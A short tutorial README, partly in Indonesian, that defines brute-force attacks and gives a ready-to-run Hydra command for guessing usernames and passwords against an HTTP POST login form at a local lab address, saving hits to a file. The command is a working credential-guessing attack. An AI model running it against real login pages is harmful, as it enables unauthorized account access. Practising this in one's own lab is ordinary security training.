# hydra-brute-force
Brute-force adalah metode serangan dalam keamanan siber yang melibatkan percobaan berulang-ulang untuk menebak informasi sensitif, seperti password, username, atau kunci enkripsi, hingga menemukan kombinasi yang benar. Dalam serangan brute-force, semua kemungkinan kombinasi diperiksa satu per satu, tanpa mengandalkan celah atau kerentanan selain mencoba setiap opsi yang mungkin.

# Hydra Brute-Force with Result Saving

This guide explains how to use Hydra for brute-force attack on an HTTP POST login form and save the valid username and password into a file.

## Prerequisites

- **Hydra**: You need to have Hydra installed on your system.
- **Target URL**: The URL of the form you're attacking, along with its parameters (username and password).
- **user.txt**: A list of usernames to test.
- **pass.txt**: A list of passwords to test.

## Command

To execute Hydra and save the valid username and password to a file called `fixpassworddanuser.txt`, run the following command:

```bash
hydra -L user.txt -P pass.txt -t 4 -V 192.168.1.2 http-post-form "/pe/low.php:username=^USER^&password=^PASS^:Login gagal. Username atau password salah." | tee -a fixpassworddanuser.txt
